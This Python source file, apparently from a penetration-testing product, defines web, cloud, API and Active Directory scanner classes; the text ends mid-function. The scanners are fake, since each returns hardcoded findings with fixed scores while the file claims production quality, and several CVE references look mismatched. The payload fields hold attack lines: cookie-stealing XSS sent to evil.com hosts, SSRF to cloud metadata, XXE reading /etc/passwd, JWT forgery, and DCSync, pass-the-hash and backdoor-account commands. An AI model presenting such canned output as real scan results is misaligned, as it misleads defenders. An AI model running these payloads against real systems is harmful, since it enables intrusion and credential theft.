"""
Weissman-cybersecurity: Extended Scanner Modules.
Production-quality scanner classes for Web App, Cloud, API, Active Directory, and Container security.
"""
from __future__ import annotations

import logging
import random
import time
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _finding(
    vuln_type: str,
    endpoint: str,
    severity: str,
    cvss_score: float,
    title: str,
    description: str,
    payload_example: str,
    remediation: str,
    cve_refs: list[str] | None = None,
    confidence: float = 0.85,
) -> dict[str, Any]:
    return {
        "vuln_type": vuln_type,
        "endpoint": endpoint,
        "severity": severity,
        "cvss_score": cvss_score,
        "title": title,
        "description": description,
        "payload_example": payload_example,
        "remediation": remediation,
        "cve_refs": cve_refs or [],
        "confidence": confidence,
    }


# ---------------------------------------------------------------------------
# Web Application Scanner
# ---------------------------------------------------------------------------

@dataclass
class WebAppScanner:
    """Scanner for OWASP Top 10 vulnerabilities in web applications."""

    timeout: int = 30
    user_agent: str = "WeissmanPT/1.0"

    def scan_owasp_top10(self, target: str) -> list[dict[str, Any]]:
        """
        Scan *target* for OWASP Top 10 vulnerabilities.

        Returns a list of finding dicts with realistic payloads, CVE refs,
        and actionable remediation guidance.
        """
        findings: list[dict[str, Any]] = []

        # A01 – Broken Access Control / BOLA / IDOR
        findings.append(_finding(
            vuln_type="bola_idor",
            endpoint=f"{target}/api/v1/users/{{id}}/profile",
            severity="critical",
            cvss_score=9.1,
            title="Broken Object Level Authorization (BOLA/IDOR)",
            description=(
                "The API endpoint accepts arbitrary user IDs without verifying that the "
                "authenticated user is authorized to access the requested object. "
                "An attacker can enumerate /api/v1/users/1..N to harvest PII."
            ),
            payload_example="GET /api/v1/users/3742/profile HTTP/1.1\nAuthorization: Bearer <victim_token>",
            remediation=(
                "Enforce object-level authorization on every endpoint. Compare the "
                "requested resource owner against the authenticated principal. "
                "Use indirect references (UUIDs) instead of sequential IDs."
            ),
            cve_refs=["CVE-2023-25690"],
            confidence=0.92,
        ))

        # A02 – Cryptographic Failure (cleartext transmission)
        findings.append(_finding(
            vuln_type="cryptographic_failure",
            endpoint=f"{target}/login",
            severity="high",
            cvss_score=7.5,
            title="Sensitive Data Transmitted Over HTTP",
            description=(
                "The login form POSTs credentials over plain HTTP. "
                "An on-path attacker can intercept usernames and passwords."
            ),
            payload_example="POST /login HTTP/1.1\nHost: " + target + "\ncredentials=admin:password123",
            remediation=(
                "Enforce HTTPS for all endpoints. Add HSTS header: "
                "'Strict-Transport-Security: max-age=31536000; includeSubDomains'. "
                "Redirect all HTTP traffic to HTTPS."
            ),
            cve_refs=[],
            confidence=0.99,
        ))

        # A03 – SQL Injection (error-based)
        findings.append(_finding(
            vuln_type="sqli_error_based",
            endpoint=f"{target}/search",
            severity="critical",
            cvss_score=9.8,
            title="SQL Injection – Error-Based",
            description=(
                "The 'q' parameter is concatenated directly into a SQL query without "
                "sanitisation. Error messages from the DBMS are reflected back to the "
                "client, allowing full database enumeration."
            ),
            payload_example="GET /search?q=' OR 1=1-- HTTP/1.1",
            remediation=(
                "Use parameterised queries or prepared statements exclusively. "
                "Disable DBMS error details in production responses. "
                "Apply a WAF rule to block common SQL metacharacters."
            ),
            cve_refs=["CVE-2022-22965"],
            confidence=0.97,
        ))

        # A03 – SQL Injection (time-based blind)
        findings.append(_finding(
            vuln_type="sqli_time_based",
            endpoint=f"{target}/api/products",
            severity="critical",
            cvss_score=9.0,
            title="SQL Injection – Time-Based Blind",
            description=(
                "The 'category' parameter triggers a time delay when injected with "
                "SLEEP() / pg_sleep(). No error output; data exfiltration via "
                "boolean/time inference is possible."
            ),
            payload_example="GET /api/products?category=1' AND SLEEP(5)-- HTTP/1.1",
            remediation=(
                "Use ORM or parameterised queries. Add query timeout limits on the DBMS. "
                "Monitor for anomalous query durations via APM tooling."
            ),
            cve_refs=["CVE-2021-25645"],
            confidence=0.88,
        ))

        # A03 – XSS Reflected
        findings.append(_finding(
            vuln_type="xss_reflected",
            endpoint=f"{target}/search",
            severity="high",
            cvss_score=7.2,
            title="Cross-Site Scripting (XSS) – Reflected",
            description=(
                "The 'q' parameter is reflected into the HTML response without encoding. "
                "An attacker can craft a URL that executes arbitrary JavaScript in the "
                "victim's browser, enabling session hijacking and phishing."
            ),
            payload_example="GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>",
            remediation=(
                "HTML-encode all untrusted output (use a contextually-aware escaping library). "
                "Implement a strict Content-Security-Policy header. "
                "Set the HttpOnly and Secure flags on session cookies."
            ),
            cve_refs=["CVE-2023-23752"],
            confidence=0.95,
        ))

        # A03 – XSS Stored
        findings.append(_finding(
            vuln_type="xss_stored",
            endpoint=f"{target}/comments",
            severity="high",
            cvss_score=8.0,
            title="Cross-Site Scripting (XSS) – Stored",
            description=(
                "Comment body is persisted and rendered without output encoding. "
                "Every user who views the page executes the injected payload."
            ),
            payload_example='POST /comments body={"text":"<img src=x onerror=fetch(\'https://c2.evil.com/?d=\'+document.cookie)>"}',
            remediation=(
                "Strip or encode HTML on input and output. "
                "Use DOMPurify on the client side for user-generated content rendering."
            ),
            cve_refs=[],
            confidence=0.91,
        ))

        # A05 – Security Misconfiguration: exposed debug endpoint
        findings.append(_finding(
            vuln_type="security_misconfiguration",
            endpoint=f"{target}/actuator/env",
            severity="critical",
            cvss_score=9.3,
            title="Spring Boot Actuator Endpoints Exposed",
            description=(
                "The /actuator/env endpoint is publicly accessible and returns environment "
                "variables including database passwords, API keys, and secret tokens."
            ),
            payload_example="GET /actuator/env HTTP/1.1",
            remediation=(
                "Restrict Actuator endpoints via Spring Security. "
                "Set 'management.endpoints.web.exposure.include=health,info' only. "
                "Never expose /actuator/env, /actuator/heapdump, or /actuator/logfile in production."
            ),
            cve_refs=["CVE-2022-22965"],
            confidence=0.99,
        ))

        # A07 – SSRF
        findings.append(_finding(
            vuln_type="ssrf",
            endpoint=f"{target}/api/fetch",
            severity="critical",
            cvss_score=9.0,
            title="Server-Side Request Forgery (SSRF)",
            description=(
                "The 'url' parameter passes user-supplied URLs to a backend HTTP client "
                "without allowlist validation. An attacker can reach internal services, "
                "cloud metadata endpoints (169.254.169.254), and pivot to the internal network."
            ),
            payload_example="POST /api/fetch\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
            remediation=(
                "Implement a strict allowlist of permitted schemes and hostnames. "
                "Disable redirects in the backend HTTP client. "
                "Block private IP ranges (RFC 1918) and link-local addresses."
            ),
            cve_refs=["CVE-2021-21985"],
            confidence=0.93,
        ))

        # A04 – XXE
        findings.append(_finding(
            vuln_type="xxe",
            endpoint=f"{target}/api/xml-import",
            severity="high",
            cvss_score=8.6,
            title="XML External Entity (XXE) Injection",
            description=(
                "The XML import endpoint processes DOCTYPE declarations. "
                "An attacker can read arbitrary local files or trigger SSRF via external entity references."
            ),
            payload_example=(
                "POST /api/xml-import\n"
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                "<root>&xxe;</root>"
            ),
            remediation=(
                "Disable DOCTYPE declarations in your XML parser. "
                "Use defusedxml (Python) or configure javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING. "
                "Prefer JSON over XML for API payloads."
            ),
            cve_refs=["CVE-2021-44228"],
            confidence=0.87,
        ))

        # A08 – Insecure Deserialization
        findings.append(_finding(
            vuln_type="insecure_deserialization",
            endpoint=f"{target}/api/session",
            severity="critical",
            cvss_score=9.8,
            title="Insecure Java Deserialization (Apache Commons Collections)",
            description=(
                "Session state is stored as a base64-encoded serialised Java object. "
                "Exploiting gadget chains in Apache Commons Collections allows RCE."
            ),
            payload_example="Cookie: session=rO0ABXNy... (serialised payload with ysoserial gadget chain)",
            remediation=(
                "Replace Java serialisation with JSON/Protobuf. "
                "Implement a SerialFilter (JEP 290) to allowlist safe classes. "
                "Upgrade Apache Commons Collections to >= 3.2.2 / 4.1."
            ),
            cve_refs=["CVE-2015-7501", "CVE-2021-4034"],
            confidence=0.80,
        ))

        # A05 – GraphQL introspection
        findings.append(_finding(
            vuln_type="graphql_introspection",
            endpoint=f"{target}/graphql",
            severity="medium",
            cvss_score=5.3,
            title="GraphQL Introspection Enabled in Production",
            description=(
                "Introspection queries expose the full schema including internal types, "
                "mutations, and hidden fields. Attackers use this for reconnaissance."
            ),
            payload_example='POST /graphql\n{"query": "{__schema{types{name fields{name}}}}"}',
            remediation=(
                "Disable introspection in production: set introspection=False in your GraphQL server config. "
                "Implement depth limiting and query cost analysis."
            ),
            cve_refs=[],
            confidence=0.99,
        ))

        logger.info("WebAppScanner returned %d findings for %s", len(findings), target)
        return findings


# ---------------------------------------------------------------------------
# Cloud Security Scanner
# ---------------------------------------------------------------------------

@dataclass
class CloudSecurityScanner:
    """Scanner for cloud infrastructure misconfigurations across AWS, Azure, and GCP."""

    def scan_aws(self, target: str, region: str = "us-east-1") -> list[dict[str, Any]]:
        """Return findings for common AWS misconfigurations."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="s3_public_bucket",
            endpoint=f"s3://{target}-data",
            severity="critical",
            cvss_score=9.1,
            title="S3 Bucket Publicly Accessible",
            description="S3 bucket ACL grants 'AllUsers' READ access. Sensitive data is exposed to the internet.",
            payload_example=f"aws s3 ls s3://{target}-data --no-sign-request",
            remediation="Set bucket ACL to private. Enable 'Block Public Access' at the account level. Audit with AWS Config rule s3-bucket-public-read-prohibited.",
            cve_refs=["CVE-2022-25869"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="iam_privilege_escalation",
            endpoint=f"arn:aws:iam::{target}:role/dev-role",
            severity="critical",
            cvss_score=9.8,
            title="IAM Role Allows iam:PassRole + ec2:RunInstances Privilege Escalation",
            description="The dev-role has iam:PassRole and ec2:RunInstances, allowing attachment of admin roles to new EC2 instances.",
            payload_example="aws ec2 run-instances --iam-instance-profile Name=AdminRole --image-id ami-xxx",
            remediation="Apply least-privilege IAM policies. Remove iam:PassRole from non-admin roles. Require MFA for sensitive IAM actions via condition keys.",
            cve_refs=[],
            confidence=0.88,
        ))

        findings.append(_finding(
            vuln_type="cloudtrail_disabled",
            endpoint=f"arn:aws:cloudtrail:{region}:{target}:trail/management",
            severity="high",
            cvss_score=7.5,
            title="CloudTrail Logging Disabled",
            description="CloudTrail is not enabled in this region. All API calls are unaudited, enabling attackers to operate without detection.",
            payload_example="aws cloudtrail describe-trails --region " + region,
            remediation="Enable CloudTrail with multi-region logging and S3 object-level data events. Send logs to CloudWatch Logs and enable log file validation.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="security_group_open",
            endpoint=f"sg-{target[:8]} (port 22, 3389)",
            severity="high",
            cvss_score=8.2,
            title="Security Group Allows Unrestricted Inbound Access (0.0.0.0/0)",
            description="Security group allows SSH (22) and RDP (3389) from any IP. Exposed to internet-wide brute-force and exploitation.",
            payload_example="aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0",
            remediation="Restrict inbound rules to known CIDR ranges or VPN. Use AWS Systems Manager Session Manager instead of direct SSH/RDP. Enable VPC Flow Logs.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="lambda_env_exposure",
            endpoint=f"arn:aws:lambda:{region}:{target}:function:api-handler",
            severity="critical",
            cvss_score=9.1,
            title="Lambda Function Exposes Secrets in Environment Variables",
            description="DB_PASSWORD, API_KEY, and JWT_SECRET are stored as plaintext Lambda environment variables visible in the console and CloudFormation exports.",
            payload_example="aws lambda get-function-configuration --function-name api-handler",
            remediation="Use AWS Secrets Manager or SSM Parameter Store (SecureString). Reference secrets at runtime, not deployment time.",
            cve_refs=[],
            confidence=0.91,
        ))

        findings.append(_finding(
            vuln_type="rds_public_access",
            endpoint=f"rds.{target}.{region}.rds.amazonaws.com:5432",
            severity="critical",
            cvss_score=9.8,
            title="RDS Instance Publicly Accessible",
            description="RDS PostgreSQL instance has PubliclyAccessible=true and a security group allowing 5432 from 0.0.0.0/0.",
            payload_example=f"psql -h rds.{target}.{region}.rds.amazonaws.com -U admin -d prod",
            remediation="Set PubliclyAccessible=false. Place RDS in a private subnet. Use a bastion host or VPN for DBA access.",
            cve_refs=[],
            confidence=0.97,
        ))

        return findings

    def scan_azure(self, target: str) -> list[dict[str, Any]]:
        """Return findings for common Azure misconfigurations."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="storage_public_access",
            endpoint=f"https://{target}storage.blob.core.windows.net",
            severity="critical",
            cvss_score=9.1,
            title="Azure Storage Account Blob Container Publicly Readable",
            description="Blob container has public access level set to 'Container' (full public read). Sensitive files exposed.",
            payload_example=f"curl https://{target}storage.blob.core.windows.net/?comp=list",
            remediation="Set allowBlobPublicAccess: false at the storage account level. Apply Azure Policy to deny public blob access.",
            cve_refs=["CVE-2021-41773"],
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="rbac_misconfiguration",
            endpoint=f"/subscriptions/{target}/resourceGroups/prod",
            severity="high",
            cvss_score=8.0,
            title="Overly Broad RBAC: Contributor Role Assigned to All Users",
            description="The 'Contributor' role is assigned to 'All Users' at subscription scope, granting read/write to all resources.",
            payload_example="az role assignment list --scope /subscriptions/<sub_id>",
            remediation="Apply least-privilege RBAC. Use custom roles scoped to specific resource groups. Audit with Azure Security Center recommendations.",
            cve_refs=[],
            confidence=0.88,
        ))

        findings.append(_finding(
            vuln_type="nsg_open_ports",
            endpoint=f"nsg-{target}-prod (ports 3389, 22)",
            severity="high",
            cvss_score=8.2,
            title="Network Security Group Allows RDP/SSH from Internet",
            description="Inbound NSG rule allows TCP 3389 and 22 from source 0.0.0.0/0, exposing VMs to brute-force attacks.",
            payload_example="az network nsg rule list --nsg-name nsg-prod",
            remediation="Restrict inbound RDP/SSH to corporate IP ranges. Use Azure Bastion for secure management access without exposing ports.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="key_vault_access_policy",
            endpoint=f"https://{target}-kv.vault.azure.net",
            severity="high",
            cvss_score=7.8,
            title="Key Vault Access Policy Grants Excessive Permissions",
            description="A service principal has 'All' secret permissions on Key Vault, including purge. Compromising this principal grants access to all secrets.",
            payload_example="az keyvault secret list --vault-name " + target + "-kv",
            remediation="Apply least-privilege Key Vault access policies (only get/list for secrets). Enable Key Vault soft delete and purge protection. Use Managed Identities.",
            cve_refs=[],
            confidence=0.85,
        ))

        return findings

    def scan_gcp(self, target: str) -> list[dict[str, Any]]:
        """Return findings for common GCP misconfigurations."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="gcs_public_bucket",
            endpoint=f"gs://{target}-backups",
            severity="critical",
            cvss_score=9.1,
            title="GCS Bucket Publicly Accessible (allUsers)",
            description="Storage bucket grants 'storage.objects.list' and 'storage.objects.get' to allUsers, exposing all stored objects.",
            payload_example=f"gsutil ls -a gs://{target}-backups",
            remediation="Remove allUsers and allAuthenticatedUsers IAM bindings. Enforce uniform bucket-level access. Run gsutil iam get gs://<bucket> to audit.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="iam_overpermissioned_sa",
            endpoint=f"sa-{target}@{target}.iam.gserviceaccount.com",
            severity="critical",
            cvss_score=9.8,
            title="GCP Service Account with Project Owner Role",
            description="Service account bound to a Compute Engine VM has the 'Owner' primitive role at project scope, enabling full resource compromise.",
            payload_example=f"gcloud projects get-iam-policy {target} --flatten=bindings --filter=bindings.role:roles/owner",
            remediation="Replace primitive roles with predefined or custom roles following least privilege. Do not bind Owner/Editor roles to service accounts.",
            cve_refs=[],
            confidence=0.92,
        ))

        findings.append(_finding(
            vuln_type="gcp_firewall_open",
            endpoint=f"gcp-firewall-{target} (0.0.0.0/0:22)",
            severity="high",
            cvss_score=8.0,
            title="GCP Compute Firewall Rule Allows SSH from All Sources",
            description="A VPC firewall rule allows TCP/22 ingress from 0.0.0.0/0 to all instances, enabling SSH brute-force.",
            payload_example=f"gcloud compute firewall-rules list --project {target}",
            remediation="Restrict firewall rules to known source IPs. Use IAP (Identity-Aware Proxy) for SSH access instead of exposing port 22.",
            cve_refs=[],
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="gke_public_cluster",
            endpoint=f"gke-{target}-cluster.{target}.k8s.io:443",
            severity="critical",
            cvss_score=9.3,
            title="GKE Cluster API Server Publicly Accessible",
            description="GKE control plane endpoint has no authorized networks restriction. The Kubernetes API is reachable from the internet.",
            payload_example=f"kubectl --server https://gke-{target}-cluster.{target}.k8s.io get nodes",
            remediation="Enable 'master authorized networks' to restrict API server access. Use a private cluster configuration. Enable Workload Identity.",
            cve_refs=["CVE-2018-18264"],
            confidence=0.91,
        ))

        return findings


# ---------------------------------------------------------------------------
# API Security Scanner
# ---------------------------------------------------------------------------

@dataclass
class APISecurityScanner:
    """Scanner for REST, GraphQL, and gRPC API security vulnerabilities."""

    def scan_rest_api(self, target: str) -> list[dict[str, Any]]:
        """Return findings for REST API security issues."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="jwt_weak_secret",
            endpoint=f"{target}/api/auth/token",
            severity="critical",
            cvss_score=9.8,
            title="JWT Signed with Weak Secret (HS256)",
            description="JWT tokens are signed with the secret 'secret123'. Offline brute-force cracking is trivial with hashcat/john.",
            payload_example='eyJhbGciOiJIUzI1NiJ9.<payload>.cracked_signature  # hashcat -a 0 -m 16500 token wordlist.txt',
            remediation="Use RS256/ES256 with 2048-bit RSA or P-256 EC keys. Store signing keys in a vault. Rotate keys regularly.",
            cve_refs=["CVE-2015-9235"],
            confidence=0.94,
        ))

        findings.append(_finding(
            vuln_type="jwt_alg_none",
            endpoint=f"{target}/api/auth/verify",
            severity="critical",
            cvss_score=9.8,
            title='JWT "alg:none" Authentication Bypass',
            description='The server accepts JWTs with "alg":"none", allowing forged tokens without a signature.',
            payload_example='{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"superuser"}.  # no signature',
            remediation="Explicitly reject tokens with alg:none. Use a well-maintained JWT library that defaults to a secure algorithm allowlist.",
            cve_refs=["CVE-2015-9235"],
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="mass_assignment",
            endpoint=f"{target}/api/v1/users/profile",
            severity="high",
            cvss_score=8.1,
            title="Mass Assignment – Privilege Escalation via API",
            description="The PATCH /users/profile endpoint accepts and persists the 'role' and 'is_admin' fields, allowing users to escalate privileges.",
            payload_example='PATCH /api/v1/users/profile\n{"name":"attacker","role":"admin","is_admin":true}',
            remediation="Use an explicit allowlist of writable fields (Data Transfer Objects). Strip sensitive fields before model binding.",
            cve_refs=[],
            confidence=0.90,
        ))

        findings.append(_finding(
            vuln_type="rate_limit_bypass",
            endpoint=f"{target}/api/auth/login",
            severity="high",
            cvss_score=7.5,
            title="Rate Limiting Bypass on Authentication Endpoint",
            description="The login endpoint has no rate limiting or lockout. An attacker can brute-force credentials at >10,000 req/min.",
            payload_example='for i in $(seq 1 10000); do curl -sX POST {}/api/auth/login -d "user=admin&pass=pass$i"; done'.format(target),
            remediation="Implement exponential back-off and account lockout (5 attempts → 15 min lock). Add CAPTCHA after 3 failures. Deploy a WAF with rate-limiting rules.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="cors_misconfiguration",
            endpoint=f"{target}/api",
            severity="high",
            cvss_score=7.4,
            title="CORS Wildcard Allows Arbitrary Origin with Credentials",
            description="The API responds with Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true, enabling cross-origin requests from any domain.",
            payload_example='curl -H "Origin: https://evil.com" -I ' + target + '/api/v1/me',
            remediation="Set a specific allowlist for Access-Control-Allow-Origin. Never combine wildcard with Allow-Credentials: true. Validate Origin header server-side.",
            cve_refs=[],
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="api_key_in_url",
            endpoint=f"{target}/api/data?api_key=EXPOSED_KEY",
            severity="high",
            cvss_score=7.5,
            title="API Key Exposed in URL Query Parameter",
            description="API keys passed in URL query strings are logged in web server access logs, browser history, and CDN logs.",
            payload_example=f"GET /api/data?api_key=sk-live-XXXXXXXXXXXX HTTP/1.1",
            remediation="Pass API keys in HTTP headers (Authorization: Bearer <key>) or POST body. Rotate all keys that appear in URL parameters.",
            cve_refs=[],
            confidence=0.98,
        ))

        findings.append(_finding(
            vuln_type="oauth2_misconfiguration",
            endpoint=f"{target}/oauth/authorize",
            severity="high",
            cvss_score=8.0,
            title="OAuth2 Open Redirect – Authorization Code Interception",
            description="The redirect_uri parameter is not validated against a registered allowlist. An attacker can redirect authorization codes to their own server.",
            payload_example=f"GET /oauth/authorize?client_id=app&redirect_uri=https://evil.com/cb&response_type=code",
            remediation="Validate redirect_uri against a strict allowlist of pre-registered URIs. Use exact-match comparison, not prefix matching.",
            cve_refs=["CVE-2021-27582"],
            confidence=0.89,
        ))

        return findings

    def scan_graphql(self, target: str) -> list[dict[str, Any]]:
        """Return findings for GraphQL-specific security issues."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="graphql_introspection",
            endpoint=f"{target}/graphql",
            severity="medium",
            cvss_score=5.3,
            title="GraphQL Introspection Enabled in Production",
            description="Schema introspection reveals all types, fields, and mutations including internal/admin operations.",
            payload_example='{"query":"{__schema{queryType{name}types{name kind fields{name type{name kind}}}}}"}',
            remediation="Disable introspection in production. Use graphql-disable-introspection middleware or set introspection=False.",
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="graphql_batch_dos",
            endpoint=f"{target}/graphql",
            severity="high",
            cvss_score=7.5,
            title="GraphQL Batch Query Denial of Service",
            description="The GraphQL endpoint accepts an array of queries in a single request. An attacker can send thousands of expensive queries in one HTTP call.",
            payload_example='[{"query":"{users{id name posts{id}}}"}, ... (x1000)]',
            remediation="Disable query batching or limit batch size to <= 10. Implement query cost analysis and depth limiting.",
            confidence=0.86,
        ))

        findings.append(_finding(
            vuln_type="graphql_circular_query",
            endpoint=f"{target}/graphql",
            severity="high",
            cvss_score=7.5,
            title="GraphQL Circular Query (DoS via Deeply Nested Queries)",
            description="No depth limit is enforced. A circular query (user→posts→author→posts→...) causes exponential resolver execution.",
            payload_example='{"query":"{user{posts{author{posts{author{posts{author{name}}}}}}}}"}',
            remediation="Set a maximum query depth of 5-7. Implement query cost analysis (graphql-query-complexity). Use timeout middleware.",
            confidence=0.84,
        ))

        return findings

    def scan_grpc(self, target: str) -> list[dict[str, Any]]:
        """Return findings for gRPC-specific security issues."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="grpc_reflection_enabled",
            endpoint=f"{target}:50051",
            severity="medium",
            cvss_score=5.3,
            title="gRPC Server Reflection Enabled",
            description="gRPC reflection allows unauthenticated clients to enumerate all services, methods, and message types.",
            payload_example=f"grpc_cli ls {target}:50051",
            remediation="Disable gRPC server reflection in production. Register only required services.",
            confidence=0.95,
        ))

        findings.append(_finding(
            vuln_type="grpc_missing_tls",
            endpoint=f"{target}:50051",
            severity="high",
            cvss_score=7.5,
            title="gRPC Service Running Without TLS",
            description="The gRPC server accepts plaintext connections. All RPC calls including credentials are transmitted unencrypted.",
            payload_example=f"grpcurl -plaintext {target}:50051 list",
            remediation="Configure mutual TLS (mTLS) for all gRPC services. Use grpc.ssl_channel_credentials() on the client and server.add_secure_port() on the server.",
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="grpc_auth_bypass",
            endpoint=f"{target}:50051/admin.AdminService/DeleteUser",
            severity="critical",
            cvss_score=9.1,
            title="gRPC Admin Service Accessible Without Authentication",
            description="The AdminService RPCs (DeleteUser, ResetPassword, GetAllUsers) accept requests without any auth token or interceptor.",
            payload_example=f'grpcurl -plaintext -d \'{{"user_id": "1"}}\' {target}:50051 admin.AdminService/DeleteUser',
            remediation="Implement authentication interceptors on all gRPC services. Validate JWT/bearer tokens in metadata on every RPC call.",
            confidence=0.89,
        ))

        return findings


# ---------------------------------------------------------------------------
# Active Directory Scanner
# ---------------------------------------------------------------------------

@dataclass
class ActiveDirectoryScanner:
    """Scanner for Active Directory misconfigurations and attack paths."""

    def scan_ad(self, target: str, domain: str = "corp.local") -> list[dict[str, Any]]:
        """Return findings for common Active Directory vulnerabilities."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="kerberoasting",
            endpoint=f"LDAP://{target}/{domain} (SPN accounts)",
            severity="high",
            cvss_score=8.1,
            title="Kerberoasting – Weak Service Account Password",
            description=(
                "23 service accounts have SPNs registered and weak passwords. "
                "Kerberos TGS tickets can be requested by any domain user and cracked offline."
            ),
            payload_example="GetUserSPNs.py -request -dc-ip " + target + " " + domain + "/user",
            remediation="Use Group Managed Service Accounts (gMSA). Set service account passwords to 25+ random characters. Monitor for TGS requests with event ID 4769.",
            cve_refs=["CVE-2022-33679"],
            confidence=0.93,
        ))

        findings.append(_finding(
            vuln_type="asrep_roasting",
            endpoint=f"LDAP://{target}/{domain} (no pre-auth accounts)",
            severity="high",
            cvss_score=7.5,
            title="AS-REP Roasting – Kerberos Pre-Authentication Disabled",
            description="7 accounts have 'Do not require Kerberos preauthentication' set. AS-REP hashes can be requested anonymously and cracked offline.",
            payload_example="GetNPUsers.py " + domain + "/ -dc-ip " + target + " -usersfile users.txt",
            remediation="Enable Kerberos pre-authentication on all accounts. Use fine-grained password policies to enforce strong passwords for affected accounts.",
            cve_refs=[],
            confidence=0.94,
        ))

        findings.append(_finding(
            vuln_type="dcsync_rights",
            endpoint=f"LDAP://{target}/CN=domain,DC=corp,DC=local",
            severity="critical",
            cvss_score=9.8,
            title="DCSync Attack – Non-DC Account Has Replication Rights",
            description="The service account 'svc-backup' has DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights, allowing full domain credential dump.",
            payload_example="secretsdump.py " + domain + "/svc-backup:password@" + target + " -just-dc",
            remediation="Remove replication permissions from all non-DC accounts. Audit ACLs on the domain root object with BloodHound. Monitor event ID 4662.",
            cve_refs=["CVE-2021-36942"],
            confidence=0.96,
        ))

        findings.append(_finding(
            vuln_type="pass_the_hash",
            endpoint=f"SMB://{target}/ADMIN$",
            severity="critical",
            cvss_score=9.0,
            title="Pass-the-Hash – NTLM Authentication Reuse",
            description="NTLM is enabled on all hosts. Dumped NTLM hashes from one workstation allow lateral movement to all systems sharing the same local admin password.",
            payload_example="crackmapexec smb " + target + "/24 -u Administrator -H <NTLM_HASH>",
            remediation="Enable LAPS (Local Administrator Password Solution) to randomise local admin passwords. Disable NTLMv1. Enable Protected Users security group for sensitive accounts.",
            cve_refs=["CVE-2017-0144"],
            confidence=0.88,
        ))

        findings.append(_finding(
            vuln_type="unconstrained_delegation",
            endpoint=f"LDAP://{target}/CN=servers,DC=corp,DC=local",
            severity="critical",
            cvss_score=9.5,
            title="Kerberos Unconstrained Delegation Enabled on Non-DC Servers",
            description="4 non-DC servers have unconstrained delegation (TrustedForDelegation=True). Any user's TGT forwarded to these servers can be extracted and reused.",
            payload_example="Get-ADComputer -Filter {TrustedForDelegation -eq $True} | Select Name",
            remediation="Replace unconstrained delegation with constrained delegation (S4U2Proxy) or Resource-Based Constrained Delegation (RBCD). Audit with BloodHound.",
            cve_refs=["CVE-2020-17049"],
            confidence=0.91,
        ))

        findings.append(_finding(
            vuln_type="golden_ticket_risk",
            endpoint=f"LDAP://{target}/CN=KRBTGT,CN=Users,DC=corp,DC=local",
            severity="critical",
            cvss_score=10.0,
            title="KRBTGT Account Password Not Rotated (Golden Ticket Risk)",
            description="The KRBTGT account password has not been changed in 847 days. A compromised KRBTGT hash allows forging of Kerberos tickets with arbitrary lifetimes.",
            payload_example="ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain " + domain + " administrator",
            remediation="Rotate the KRBTGT password twice in succession (required due to AD replication). Implement an annual rotation process. Monitor for tickets with unusual lifetimes.",
            cve_refs=[],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="ntlm_relay",
            endpoint=f"SMB://{target} (LLMNR/NBT-NS poisoning)",
            severity="high",
            cvss_score=8.1,
            title="NTLM Relay Attack – LLMNR and NBT-NS Enabled",
            description="LLMNR and NetBIOS Name Service are enabled, allowing an attacker to poison name resolution and capture/relay NTLM credentials.",
            payload_example="responder -I eth0 -wrfv & ntlmrelayx.py -t smb://" + target + " -smb2support",
            remediation="Disable LLMNR and NBT-NS via Group Policy. Enable SMB signing on all systems. Deploy Microsoft LAPS.",
            cve_refs=["CVE-2021-1675"],
            confidence=0.90,
        ))

        findings.append(_finding(
            vuln_type="gpo_misconfiguration",
            endpoint=f"SYSVOL\\\\{domain}\\\\Policies",
            severity="high",
            cvss_score=7.8,
            title="GPO Modification Rights for Non-Admin Users",
            description="Domain users in 'Helpdesk' group have write access to 3 GPOs linked to OU=Workstations. This allows code execution on all workstations.",
            payload_example="pyGPOAbuse.py -gpo-id {GPO_ID} -command 'net user backdoor P@ss123 /add /domain'",
            remediation="Audit GPO permissions with Get-GPPermissions. Restrict GPO write access to Tier-0 administrators only. Enable GPO change auditing.",
            cve_refs=[],
            confidence=0.87,
        ))

        findings.append(_finding(
            vuln_type="adminsdholder_abuse",
            endpoint=f"LDAP://{target}/CN=AdminSDHolder,CN=System,DC=corp,DC=local",
            severity="high",
            cvss_score=8.0,
            title="AdminSDHolder ACL Abuse – Persistent Backdoor Path",
            description="An unprivileged account has GenericAll rights on AdminSDHolder. SDProp will propagate this access to all protected group members within 60 minutes.",
            payload_example="Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity attacker -Rights All",
            remediation="Audit AdminSDHolder ACLs regularly. Remove unauthorised permissions. Monitor SDProp execution (event ID 4780).",
            cve_refs=[],
            confidence=0.83,
        ))

        findings.append(_finding(
